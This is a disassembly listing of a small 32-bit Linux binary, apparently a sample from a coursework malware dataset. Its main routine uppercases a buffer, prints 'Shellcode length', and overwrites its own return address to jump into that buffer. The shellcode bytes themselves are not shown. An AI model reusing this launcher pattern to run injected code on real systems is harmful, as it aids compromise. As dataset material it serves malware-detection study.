
/home/stas/Coursach/Выборки/compiled/viruses/13427:     формат файла elf32-i386


Дизассемблирование раздела .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Дизассемблирование раздела .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    $0x0,%al
 804816a:	00 00                	add    %al,(%eax)
 804816c:	10 00                	adc    %al,(%eax)
 804816e:	00 00                	add    %al,(%eax)
 8048170:	01 00                	add    %eax,(%eax)
 8048172:	00 00                	add    %al,(%eax)
 8048174:	47                   	inc    %edi
 8048175:	4e                   	dec    %esi
 8048176:	55                   	push   %ebp
 8048177:	00 00                	add    %al,(%eax)
 8048179:	00 00                	add    %al,(%eax)
 804817b:	00 02                	add    %al,(%edx)
 804817d:	00 00                	add    %al,(%eax)
 804817f:	00 06                	add    %al,(%esi)
 8048181:	00 00                	add    %al,(%eax)
 8048183:	00 18                	add    %bl,(%eax)
 8048185:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    $0x0,%al
 804818a:	00 00                	add    %al,(%eax)
 804818c:	14 00                	adc    $0x0,%al
 804818e:	00 00                	add    %al,(%eax)
 8048190:	03 00                	add    (%eax),%eax
 8048192:	00 00                	add    %al,(%eax)
 8048194:	47                   	inc    %edi
 8048195:	4e                   	dec    %esi
 8048196:	55                   	push   %ebp
 8048197:	00 20                	add    %ah,(%eax)
 8048199:	3b 9b ec e1 db 8d    	cmp    -0x72241e14(%ebx),%ebx
 804819f:	33 ec                	xor    %esp,%ebp
 80481a1:	32 6f 4b             	xor    0x4b(%edi),%ch
 80481a4:	d7                   	xlat   %ds:(%ebx)
 80481a5:	94                   	xchg   %eax,%esp
 80481a6:	40                   	inc    %eax
 80481a7:	0f c4 36 45          	pinsrw $0x45,(%esi),%mm6
 80481ab:	4f                   	dec    %edi

Дизассемблирование раздела .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    (%eax),%al
 80481ae:	00 00                	add    %al,(%eax)
 80481b0:	07                   	pop    %es
 80481b1:	00 00                	add    %al,(%eax)
 80481b3:	00 01                	add    %al,(%ecx)
 80481b5:	00 00                	add    %al,(%eax)
 80481b7:	00 05 00 00 00 00    	add    %al,0x0
 80481bd:	20 00                	and    %al,(%eax)
 80481bf:	20 00                	and    %al,(%eax)
 80481c1:	00 00                	add    %al,(%eax)
 80481c3:	00 07                	add    %al,(%edi)
 80481c5:	00 00                	add    %al,(%eax)
 80481c7:	00                   	.byte 0x0
 80481c8:	ad                   	lods   %ds:(%esi),%eax
 80481c9:	4b                   	dec    %ebx
 80481ca:	e3 c0                	jecxz  804818c <_init-0x1ac>

Дизассемблирование раздела .dynsym:

080481cc <.dynsym>:
	...
 80481dc:	1a 00                	sbb    (%eax),%al
	...
 80481e6:	00 00                	add    %al,(%eax)
 80481e8:	12 00                	adc    (%eax),%al
 80481ea:	00 00                	add    %al,(%eax)
 80481ec:	50                   	push   %eax
	...
 80481f5:	00 00                	add    %al,(%eax)
 80481f7:	00 20                	add    %ah,(%eax)
 80481f9:	00 00                	add    %al,(%eax)
 80481fb:	00 21                	add    %ah,(%ecx)
	...
 8048205:	00 00                	add    %al,(%eax)
 8048207:	00 12                	add    %dl,(%edx)
 8048209:	00 00                	add    %al,(%eax)
 804820b:	00 3e                	add    %bh,(%esi)
	...
 8048215:	00 00                	add    %al,(%eax)
 8048217:	00 12                	add    %dl,(%edx)
 8048219:	00 00                	add    %al,(%eax)
 804821b:	00 28                	add    %ch,(%eax)
	...
 8048225:	00 00                	add    %al,(%eax)
 8048227:	00 12                	add    %dl,(%edx)
 8048229:	00 00                	add    %al,(%eax)
 804822b:	00 30                	add    %dh,(%eax)
	...
 8048235:	00 00                	add    %al,(%eax)
 8048237:	00 12                	add    %dl,(%edx)
 8048239:	00 00                	add    %al,(%eax)
 804823b:	00 0b                	add    %cl,(%ebx)
 804823d:	00 00                	add    %al,(%eax)
 804823f:	00 fc                	add    %bh,%ah
 8048241:	85 04 08             	test   %eax,(%eax,%ecx,1)
 8048244:	04 00                	add    $0x0,%al
 8048246:	00 00                	add    %al,(%eax)
 8048248:	11 00                	adc    %eax,(%eax)
 804824a:	0f                   	.byte 0xf
	...

Дизассемблирование раздела .dynstr:

0804824c <.dynstr>:
 804824c:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 8048250:	63 2e                	arpl   %bp,(%esi)
 8048252:	73 6f                	jae    80482c3 <_init-0x75>
 8048254:	2e 36 00 5f 49       	cs add %bl,%cs:%ss:0x49(%edi)
 8048259:	4f                   	dec    %edi
 804825a:	5f                   	pop    %edi
 804825b:	73 74                	jae    80482d1 <_init-0x67>
 804825d:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 8048264:	64 
 8048265:	00 70 72             	add    %dh,0x72(%eax)
 8048268:	69 6e 74 66 00 73 74 	imul   $0x74730066,0x74(%esi),%ebp
 804826f:	72 6c                	jb     80482dd <_init-0x5b>
 8048271:	65 6e                	outsb  %gs:(%esi),(%dx)
 8048273:	00 74 6f 75          	add    %dh,0x75(%edi,%ebp,2)
 8048277:	70 70                	jo     80482e9 <_init-0x4f>
 8048279:	65                   	gs
 804827a:	72 00                	jb     804827c <_init-0xbc>
 804827c:	5f                   	pop    %edi
 804827d:	5f                   	pop    %edi
 804827e:	63 74 79 70          	arpl   %si,0x70(%ecx,%edi,2)
 8048282:	65                   	gs
 8048283:	5f                   	pop    %edi
 8048284:	62 5f 6c             	bound  %ebx,0x6c(%edi)
 8048287:	6f                   	outsl  %ds:(%esi),(%dx)
 8048288:	63 00                	arpl   %ax,(%eax)
 804828a:	5f                   	pop    %edi
 804828b:	5f                   	pop    %edi
 804828c:	6c                   	insb   (%dx),%es:(%edi)
 804828d:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 8048294:	72 74                	jb     804830a <_init-0x2e>
 8048296:	5f                   	pop    %edi
 8048297:	6d                   	insl   (%dx),%es:(%edi)
 8048298:	61                   	popa   
 8048299:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%esi),%ebp
 80482a0:	6f                   	outsl  %ds:(%esi),(%dx)
 80482a1:	6e                   	outsb  %ds:(%esi),(%dx)
 80482a2:	5f                   	pop    %edi
 80482a3:	73 74                	jae    8048319 <_init-0x1f>
 80482a5:	61                   	popa   
 80482a6:	72 74                	jb     804831c <_init-0x1c>
 80482a8:	5f                   	pop    %edi
 80482a9:	5f                   	pop    %edi
 80482aa:	00 47 4c             	add    %al,0x4c(%edi)
 80482ad:	49                   	dec    %ecx
 80482ae:	42                   	inc    %edx
 80482af:	43                   	inc    %ebx
 80482b0:	5f                   	pop    %edi
 80482b1:	32 2e                	xor    (%esi),%ch
 80482b3:	33 00                	xor    (%eax),%eax
 80482b5:	47                   	inc    %edi
 80482b6:	4c                   	dec    %esp
 80482b7:	49                   	dec    %ecx
 80482b8:	42                   	inc    %edx
 80482b9:	43                   	inc    %ebx
 80482ba:	5f                   	pop    %edi
 80482bb:	32 2e                	xor    (%esi),%ch
 80482bd:	30 00                	xor    %al,(%eax)

Дизассемблирование раздела .gnu.version:

080482c0 <.gnu.version>:
 80482c0:	00 00                	add    %al,(%eax)
 80482c2:	02 00                	add    (%eax),%al
 80482c4:	00 00                	add    %al,(%eax)
 80482c6:	02 00                	add    (%eax),%al
 80482c8:	02 00                	add    (%eax),%al
 80482ca:	02 00                	add    (%eax),%al
 80482cc:	03 00                	add    (%eax),%eax
 80482ce:	01 00                	add    %eax,(%eax)

Дизассемблирование раздела .gnu.version_r:

080482d0 <.gnu.version_r>:
 80482d0:	01 00                	add    %eax,(%eax)
 80482d2:	02 00                	add    (%eax),%al
 80482d4:	01 00                	add    %eax,(%eax)
 80482d6:	00 00                	add    %al,(%eax)
 80482d8:	10 00                	adc    %al,(%eax)
 80482da:	00 00                	add    %al,(%eax)
 80482dc:	00 00                	add    %al,(%eax)
 80482de:	00 00                	add    %al,(%eax)
 80482e0:	13 69 69             	adc    0x69(%ecx),%ebp
 80482e3:	0d 00 00 03 00       	or     $0x30000,%eax
 80482e8:	5f                   	pop    %edi
 80482e9:	00 00                	add    %al,(%eax)
 80482eb:	00 10                	add    %dl,(%eax)
 80482ed:	00 00                	add    %al,(%eax)
 80482ef:	00 10                	add    %dl,(%eax)
 80482f1:	69 69 0d 00 00 02 00 	imul   $0x20000,0xd(%ecx),%ebp
 80482f8:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
	...

Дизассемблирование раздела .rel.dyn:

08048300 <.rel.dyn>:
 8048300:	fc                   	cld    
 8048301:	9f                   	lahf   
 8048302:	04 08                	add    $0x8,%al
 8048304:	06                   	push   %es
 8048305:	02 00                	add    (%eax),%al
	...

Дизассемблирование раздела .rel.plt:

08048308 <.rel.plt>:
 8048308:	0c a0                	or     $0xa0,%al
 804830a:	04 08                	add    $0x8,%al
 804830c:	07                   	pop    %es
 804830d:	01 00                	add    %eax,(%eax)
 804830f:	00 10                	add    %dl,(%eax)
 8048311:	a0 04 08 07 02       	mov    0x2070804,%al
 8048316:	00 00                	add    %al,(%eax)
 8048318:	14 a0                	adc    $0xa0,%al
 804831a:	04 08                	add    $0x8,%al
 804831c:	07                   	pop    %es
 804831d:	03 00                	add    (%eax),%eax
 804831f:	00 18                	add    %bl,(%eax)
 8048321:	a0 04 08 07 04       	mov    0x4070804,%al
 8048326:	00 00                	add    %al,(%eax)
 8048328:	1c a0                	sbb    $0xa0,%al
 804832a:	04 08                	add    $0x8,%al
 804832c:	07                   	pop    %es
 804832d:	05 00 00 20 a0       	add    $0xa0200000,%eax
 8048332:	04 08                	add    $0x8,%al
 8048334:	07                   	pop    %es
 8048335:	06                   	push   %es
	...

Дизассемблирование раздела .init:

08048338 <_init>:
 8048338:	53                   	push   %ebx
 8048339:	83 ec 08             	sub    $0x8,%esp
 804833c:	e8 bf 00 00 00       	call   8048400 <__x86.get_pc_thunk.bx>
 8048341:	81 c3 bf 1c 00 00    	add    $0x1cbf,%ebx
 8048347:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 804834d:	85 c0                	test   %eax,%eax
 804834f:	74 05                	je     8048356 <_init+0x1e>
 8048351:	e8 2a 00 00 00       	call   8048380 <__gmon_start__@plt>
 8048356:	83 c4 08             	add    $0x8,%esp
 8048359:	5b                   	pop    %ebx
 804835a:	c3                   	ret    

Дизассемблирование раздела .plt:

08048360 <printf@plt-0x10>:
 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804836c:	00 00                	add    %al,(%eax)
	...

08048370 <printf@plt>:
 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048376:	68 00 00 00 00       	push   $0x0
 804837b:	e9 e0 ff ff ff       	jmp    8048360 <_init+0x28>

08048380 <__gmon_start__@plt>:
 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048386:	68 08 00 00 00       	push   $0x8
 804838b:	e9 d0 ff ff ff       	jmp    8048360 <_init+0x28>

08048390 <strlen@plt>:
 8048390:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048396:	68 10 00 00 00       	push   $0x10
 804839b:	e9 c0 ff ff ff       	jmp    8048360 <_init+0x28>

080483a0 <__libc_start_main@plt>:
 80483a0:	ff 25 18 a0 04 08    	jmp    *0x804a018
 80483a6:	68 18 00 00 00       	push   $0x18
 80483ab:	e9 b0 ff ff ff       	jmp    8048360 <_init+0x28>

080483b0 <toupper@plt>:
 80483b0:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 80483b6:	68 20 00 00 00       	push   $0x20
 80483bb:	e9 a0 ff ff ff       	jmp    8048360 <_init+0x28>

080483c0 <__ctype_b_loc@plt>:
 80483c0:	ff 25 20 a0 04 08    	jmp    *0x804a020
 80483c6:	68 28 00 00 00       	push   $0x28
 80483cb:	e9 90 ff ff ff       	jmp    8048360 <_init+0x28>

Дизассемблирование раздела .text:

080483d0 <_start>:
 80483d0:	31 ed                	xor    %ebp,%ebp
 80483d2:	5e                   	pop    %esi
 80483d3:	89 e1                	mov    %esp,%ecx
 80483d5:	83 e4 f0             	and    $0xfffffff0,%esp
 80483d8:	50                   	push   %eax
 80483d9:	54                   	push   %esp
 80483da:	52                   	push   %edx
 80483db:	68 e0 85 04 08       	push   $0x80485e0
 80483e0:	68 70 85 04 08       	push   $0x8048570
 80483e5:	51                   	push   %ecx
 80483e6:	56                   	push   %esi
 80483e7:	68 cd 84 04 08       	push   $0x80484cd
 80483ec:	e8 af ff ff ff       	call   80483a0 <__libc_start_main@plt>
 80483f1:	f4                   	hlt    
 80483f2:	66 90                	xchg   %ax,%ax
 80483f4:	66 90                	xchg   %ax,%ax
 80483f6:	66 90                	xchg   %ax,%ax
 80483f8:	66 90                	xchg   %ax,%ax
 80483fa:	66 90                	xchg   %ax,%ax
 80483fc:	66 90                	xchg   %ax,%ax
 80483fe:	66 90                	xchg   %ax,%ax

08048400 <__x86.get_pc_thunk.bx>:
 8048400:	8b 1c 24             	mov    (%esp),%ebx
 8048403:	c3                   	ret    
 8048404:	66 90                	xchg   %ax,%ax
 8048406:	66 90                	xchg   %ax,%ax
 8048408:	66 90                	xchg   %ax,%ax
 804840a:	66 90                	xchg   %ax,%ax
 804840c:	66 90                	xchg   %ax,%ax
 804840e:	66 90                	xchg   %ax,%ax

08048410 <deregister_tm_clones>:
 8048410:	b8 47 a1 04 08       	mov    $0x804a147,%eax
 8048415:	2d 44 a1 04 08       	sub    $0x804a144,%eax
 804841a:	83 f8 06             	cmp    $0x6,%eax
 804841d:	77 01                	ja     8048420 <deregister_tm_clones+0x10>
 804841f:	c3                   	ret    
 8048420:	b8 00 00 00 00       	mov    $0x0,%eax
 8048425:	85 c0                	test   %eax,%eax
 8048427:	74 f6                	je     804841f <deregister_tm_clones+0xf>
 8048429:	55                   	push   %ebp
 804842a:	89 e5                	mov    %esp,%ebp
 804842c:	83 ec 18             	sub    $0x18,%esp
 804842f:	c7 04 24 44 a1 04 08 	movl   $0x804a144,(%esp)
 8048436:	ff d0                	call   *%eax
 8048438:	c9                   	leave  
 8048439:	c3                   	ret    
 804843a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

08048440 <register_tm_clones>:
 8048440:	b8 44 a1 04 08       	mov    $0x804a144,%eax
 8048445:	2d 44 a1 04 08       	sub    $0x804a144,%eax
 804844a:	c1 f8 02             	sar    $0x2,%eax
 804844d:	89 c2                	mov    %eax,%edx
 804844f:	c1 ea 1f             	shr    $0x1f,%edx
 8048452:	01 d0                	add    %edx,%eax
 8048454:	d1 f8                	sar    %eax
 8048456:	75 01                	jne    8048459 <register_tm_clones+0x19>
 8048458:	c3                   	ret    
 8048459:	ba 00 00 00 00       	mov    $0x0,%edx
 804845e:	85 d2                	test   %edx,%edx
 8048460:	74 f6                	je     8048458 <register_tm_clones+0x18>
 8048462:	55                   	push   %ebp
 8048463:	89 e5                	mov    %esp,%ebp
 8048465:	83 ec 18             	sub    $0x18,%esp
 8048468:	89 44 24 04          	mov    %eax,0x4(%esp)
 804846c:	c7 04 24 44 a1 04 08 	movl   $0x804a144,(%esp)
 8048473:	ff d2                	call   *%edx
 8048475:	c9                   	leave  
 8048476:	c3                   	ret    
 8048477:	89 f6                	mov    %esi,%esi
 8048479:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048480 <__do_global_dtors_aux>:
 8048480:	80 3d 43 a1 04 08 00 	cmpb   $0x0,0x804a143
 8048487:	75 13                	jne    804849c <__do_global_dtors_aux+0x1c>
 8048489:	55                   	push   %ebp
 804848a:	89 e5                	mov    %esp,%ebp
 804848c:	83 ec 08             	sub    $0x8,%esp
 804848f:	e8 7c ff ff ff       	call   8048410 <deregister_tm_clones>
 8048494:	c6 05 43 a1 04 08 01 	movb   $0x1,0x804a143
 804849b:	c9                   	leave  
 804849c:	f3 c3                	repz ret 
 804849e:	66 90                	xchg   %ax,%ax

080484a0 <frame_dummy>:
 80484a0:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 80484a5:	85 c0                	test   %eax,%eax
 80484a7:	74 1f                	je     80484c8 <frame_dummy+0x28>
 80484a9:	b8 00 00 00 00       	mov    $0x0,%eax
 80484ae:	85 c0                	test   %eax,%eax
 80484b0:	74 16                	je     80484c8 <frame_dummy+0x28>
 80484b2:	55                   	push   %ebp
 80484b3:	89 e5                	mov    %esp,%ebp
 80484b5:	83 ec 18             	sub    $0x18,%esp
 80484b8:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 80484bf:	ff d0                	call   *%eax
 80484c1:	c9                   	leave  
 80484c2:	e9 79 ff ff ff       	jmp    8048440 <register_tm_clones>
 80484c7:	90                   	nop
 80484c8:	e9 73 ff ff ff       	jmp    8048440 <register_tm_clones>

080484cd <main>:
 80484cd:	55                   	push   %ebp
 80484ce:	89 e5                	mov    %esp,%ebp
 80484d0:	83 e4 f0             	and    $0xfffffff0,%esp
 80484d3:	83 ec 20             	sub    $0x20,%esp
 80484d6:	c7 44 24 1c 60 a0 04 	movl   $0x804a060,0x1c(%esp)
 80484dd:	08 
 80484de:	eb 43                	jmp    8048523 <main+0x56>
 80484e0:	e8 db fe ff ff       	call   80483c0 <__ctype_b_loc@plt>
 80484e5:	8b 10                	mov    (%eax),%edx
 80484e7:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80484eb:	0f b6 00             	movzbl (%eax),%eax
 80484ee:	0f be c0             	movsbl %al,%eax
 80484f1:	01 c0                	add    %eax,%eax
 80484f3:	01 d0                	add    %edx,%eax
 80484f5:	0f b7 00             	movzwl (%eax),%eax
 80484f8:	0f b7 c0             	movzwl %ax,%eax
 80484fb:	25 00 02 00 00       	and    $0x200,%eax
 8048500:	85 c0                	test   %eax,%eax
 8048502:	74 1a                	je     804851e <main+0x51>
 8048504:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048508:	0f b6 00             	movzbl (%eax),%eax
 804850b:	0f be c0             	movsbl %al,%eax
 804850e:	89 04 24             	mov    %eax,(%esp)
 8048511:	e8 9a fe ff ff       	call   80483b0 <toupper@plt>
 8048516:	89 c2                	mov    %eax,%edx
 8048518:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 804851c:	88 10                	mov    %dl,(%eax)
 804851e:	83 44 24 1c 01       	addl   $0x1,0x1c(%esp)
 8048523:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048527:	0f b6 00             	movzbl (%eax),%eax
 804852a:	84 c0                	test   %al,%al
 804852c:	75 b2                	jne    80484e0 <main+0x13>
 804852e:	8d 44 24 18          	lea    0x18(%esp),%eax
 8048532:	83 c0 0c             	add    $0xc,%eax
 8048535:	89 44 24 18          	mov    %eax,0x18(%esp)
 8048539:	c7 04 24 60 a0 04 08 	movl   $0x804a060,(%esp)
 8048540:	e8 4b fe ff ff       	call   8048390 <strlen@plt>
 8048545:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048549:	c7 04 24 00 86 04 08 	movl   $0x8048600,(%esp)
 8048550:	e8 1b fe ff ff       	call   8048370 <printf@plt>
 8048555:	8b 44 24 18          	mov    0x18(%esp),%eax
 8048559:	ba 60 a0 04 08       	mov    $0x804a060,%edx
 804855e:	89 10                	mov    %edx,(%eax)
 8048560:	c9                   	leave  
 8048561:	c3                   	ret    
 8048562:	66 90                	xchg   %ax,%ax
 8048564:	66 90                	xchg   %ax,%ax
 8048566:	66 90                	xchg   %ax,%ax
 8048568:	66 90                	xchg   %ax,%ax
 804856a:	66 90                	xchg   %ax,%ax
 804856c:	66 90                	xchg   %ax,%ax
 804856e:	66 90                	xchg   %ax,%ax

08048570 <__libc_csu_init>:
 8048570:	55                   	push   %ebp
 8048571:	57                   	push   %edi
 8048572:	31 ff                	xor    %edi,%edi
 8048574:	56                   	push   %esi
 8048575:	53                   	push   %ebx
 8048576:	e8 85 fe ff ff       	call   8048400 <__x86.get_pc_thunk.bx>
 804857b:	81 c3 85 1a 00 00    	add    $0x1a85,%ebx
 8048581:	83 ec 1c             	sub    $0x1c,%esp
 8048584:	8b 6c 24 30          	mov    0x30(%esp),%ebp
 8048588:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 804858e:	e8 a5 fd ff ff       	call   8048338 <_init>
 8048593:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 8048599:	29 c6                	sub    %eax,%esi
 804859b:	c1 fe 02             	sar    $0x2,%esi
 804859e:	85 f6                	test   %esi,%esi
 80485a0:	74 27                	je     80485c9 <__libc_csu_init+0x59>
 80485a2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 80485a8:	8b 44 24 38          	mov    0x38(%esp),%eax
 80485ac:	89 2c 24             	mov    %ebp,(%esp)
 80485af:	89 44 24 08          	mov    %eax,0x8(%esp)
 80485b3:	8b 44 24 34          	mov    0x34(%esp),%eax
 80485b7:	89 44 24 04          	mov    %eax,0x4(%esp)
 80485bb:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 80485c2:	83 c7 01             	add    $0x1,%edi
 80485c5:	39 f7                	cmp    %esi,%edi
 80485c7:	75 df                	jne    80485a8 <__libc_csu_init+0x38>
 80485c9:	83 c4 1c             	add    $0x1c,%esp
 80485cc:	5b                   	pop    %ebx
 80485cd:	5e                   	pop    %esi
 80485ce:	5f                   	pop    %edi
 80485cf:	5d                   	pop    %ebp
 80485d0:	c3                   	ret    
 80485d1:	eb 0d                	jmp    80485e0 <__libc_csu_fini>
 80485d3:	90                   	nop
 80485d4:	90                   	nop
 80485d5:	90                   	nop
 80485d6:	90                   	nop
 80485d7:	90                   	nop
 80485d8:	90                   	nop
 80485d9:	90                   	nop
 80485da:	90                   	nop
 80485db:	90                   	nop
 80485dc:	90                   	nop
 80485dd:	90                   	nop
 80485de:	90                   	nop
 80485df:	90                   	nop

080485e0 <__libc_csu_fini>:
 80485e0:	f3 c3                	repz ret 

Дизассемблирование раздела .fini:

080485e4 <_fini>:
 80485e4:	53                   	push   %ebx
 80485e5:	83 ec 08             	sub    $0x8,%esp
 80485e8:	e8 13 fe ff ff       	call   8048400 <__x86.get_pc_thunk.bx>
 80485ed:	81 c3 13 1a 00 00    	add    $0x1a13,%ebx
 80485f3:	83 c4 08             	add    $0x8,%esp
 80485f6:	5b                   	pop    %ebx
 80485f7:	c3                   	ret    

Дизассемблирование раздела .rodata:

080485f8 <_fp_hw>:
 80485f8:	03 00                	add    (%eax),%eax
	...

080485fc <_IO_stdin_used>:
 80485fc:	01 00                	add    %eax,(%eax)
 80485fe:	02 00                	add    (%eax),%al
 8048600:	53                   	push   %ebx
 8048601:	68 65 6c 6c 63       	push   $0x636c6c65
 8048606:	6f                   	outsl  %ds:(%esi),(%dx)
 8048607:	64 65 20 6c 65 6e    	fs and %ch,%fs:%gs:0x6e(%ebp,%eiz,2)
 804860d:	67 68 74 3d 25 64    	addr16 push $0x64253d74
 8048613:	0a 00                	or     (%eax),%al

Дизассемблирование раздела .eh_frame_hdr:

08048618 <.eh_frame_hdr>:
 8048618:	01 1b                	add    %ebx,(%ebx)
 804861a:	03 3b                	add    (%ebx),%edi
 804861c:	28 00                	sub    %al,(%eax)
 804861e:	00 00                	add    %al,(%eax)
 8048620:	04 00                	add    $0x0,%al
 8048622:	00 00                	add    %al,(%eax)
 8048624:	48                   	dec    %eax
 8048625:	fd                   	std    
 8048626:	ff                   	(bad)  
 8048627:	ff 44 00 00          	incl   0x0(%eax,%eax,1)
 804862b:	00 b5 fe ff ff 68    	add    %dh,0x68fffffe(%ebp)
 8048631:	00 00                	add    %al,(%eax)
 8048633:	00 58 ff             	add    %bl,-0x1(%eax)
 8048636:	ff                   	(bad)  
 8048637:	ff 88 00 00 00 c8    	decl   -0x38000000(%eax)
 804863d:	ff                   	(bad)  
 804863e:	ff                   	(bad)  
 804863f:	ff c4                	inc    %esp
 8048641:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .eh_frame:

08048644 <__FRAME_END__-0xac>:
 8048644:	14 00                	adc    $0x0,%al
 8048646:	00 00                	add    %al,(%eax)
 8048648:	00 00                	add    %al,(%eax)
 804864a:	00 00                	add    %al,(%eax)
 804864c:	01 7a 52             	add    %edi,0x52(%edx)
 804864f:	00 01                	add    %al,(%ecx)
 8048651:	7c 08                	jl     804865b <_IO_stdin_used+0x5f>
 8048653:	01 1b                	add    %ebx,(%ebx)
 8048655:	0c 04                	or     $0x4,%al
 8048657:	04 88                	add    $0x88,%al
 8048659:	01 00                	add    %eax,(%eax)
 804865b:	00 20                	add    %ah,(%eax)
 804865d:	00 00                	add    %al,(%eax)
 804865f:	00 1c 00             	add    %bl,(%eax,%eax,1)
 8048662:	00 00                	add    %al,(%eax)
 8048664:	fc                   	cld    
 8048665:	fc                   	cld    
 8048666:	ff                   	(bad)  
 8048667:	ff 70 00             	pushl  0x0(%eax)
 804866a:	00 00                	add    %al,(%eax)
 804866c:	00 0e                	add    %cl,(%esi)
 804866e:	08 46 0e             	or     %al,0xe(%esi)
 8048671:	0c 4a                	or     $0x4a,%al
 8048673:	0f 0b                	ud2    
 8048675:	74 04                	je     804867b <_IO_stdin_used+0x7f>
 8048677:	78 00                	js     8048679 <_IO_stdin_used+0x7d>
 8048679:	3f                   	aas    
 804867a:	1a 3b                	sbb    (%ebx),%bh
 804867c:	2a 32                	sub    (%edx),%dh
 804867e:	24 22                	and    $0x22,%al
 8048680:	1c 00                	sbb    $0x0,%al
 8048682:	00 00                	add    %al,(%eax)
 8048684:	40                   	inc    %eax
 8048685:	00 00                	add    %al,(%eax)
 8048687:	00 45 fe             	add    %al,-0x2(%ebp)
 804868a:	ff                   	(bad)  
 804868b:	ff 95 00 00 00 00    	call   *0x0(%ebp)
 8048691:	41                   	inc    %ecx
 8048692:	0e                   	push   %cs
 8048693:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 8048699:	02 91 c5 0c 04 04    	add    0x4040cc5(%ecx),%dl
 804869f:	00 38                	add    %bh,(%eax)
 80486a1:	00 00                	add    %al,(%eax)
 80486a3:	00 60 00             	add    %ah,0x0(%eax)
 80486a6:	00 00                	add    %al,(%eax)
 80486a8:	c8 fe ff ff          	enter  $0xfffe,$0xff
 80486ac:	61                   	popa   
 80486ad:	00 00                	add    %al,(%eax)
 80486af:	00 00                	add    %al,(%eax)
 80486b1:	41                   	inc    %ecx
 80486b2:	0e                   	push   %cs
 80486b3:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
 80486b9:	87 03                	xchg   %eax,(%ebx)
 80486bb:	43                   	inc    %ebx
 80486bc:	0e                   	push   %cs
 80486bd:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
 80486c3:	83 05 4e 0e 30 02 48 	addl   $0x48,0x2300e4e
 80486ca:	0e                   	push   %cs
 80486cb:	14 41                	adc    $0x41,%al
 80486cd:	c3                   	ret    
 80486ce:	0e                   	push   %cs
 80486cf:	10 41 c6             	adc    %al,-0x3a(%ecx)
 80486d2:	0e                   	push   %cs
 80486d3:	0c 41                	or     $0x41,%al
 80486d5:	c7                   	(bad)  
 80486d6:	0e                   	push   %cs
 80486d7:	08 41 c5             	or     %al,-0x3b(%ecx)
 80486da:	0e                   	push   %cs
 80486db:	04 10                	add    $0x10,%al
 80486dd:	00 00                	add    %al,(%eax)
 80486df:	00 9c 00 00 00 fc fe 	add    %bl,-0x1040000(%eax,%eax,1)
 80486e6:	ff                   	(bad)  
 80486e7:	ff 02                	incl   (%edx)
 80486e9:	00 00                	add    %al,(%eax)
 80486eb:	00 00                	add    %al,(%eax)
 80486ed:	00 00                	add    %al,(%eax)
	...

080486f0 <__FRAME_END__>:
 80486f0:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	a0                   	.byte 0xa0
 8049f09:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	80                   	.byte 0x80
 8049f0d:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    %eax,(%eax)
 8049f16:	00 00                	add    %al,(%eax)
 8049f18:	01 00                	add    %eax,(%eax)
 8049f1a:	00 00                	add    %al,(%eax)
 8049f1c:	0c 00                	or     $0x0,%al
 8049f1e:	00 00                	add    %al,(%eax)
 8049f20:	38 83 04 08 0d 00    	cmp    %al,0xd0804(%ebx)
 8049f26:	00 00                	add    %al,(%eax)
 8049f28:	e4 85                	in     $0x85,%al
 8049f2a:	04 08                	add    $0x8,%al
 8049f2c:	19 00                	sbb    %eax,(%eax)
 8049f2e:	00 00                	add    %al,(%eax)
 8049f30:	08 9f 04 08 1b 00    	or     %bl,0x1b0804(%edi)
 8049f36:	00 00                	add    %al,(%eax)
 8049f38:	04 00                	add    $0x0,%al
 8049f3a:	00 00                	add    %al,(%eax)
 8049f3c:	1a 00                	sbb    (%eax),%al
 8049f3e:	00 00                	add    %al,(%eax)
 8049f40:	0c 9f                	or     $0x9f,%al
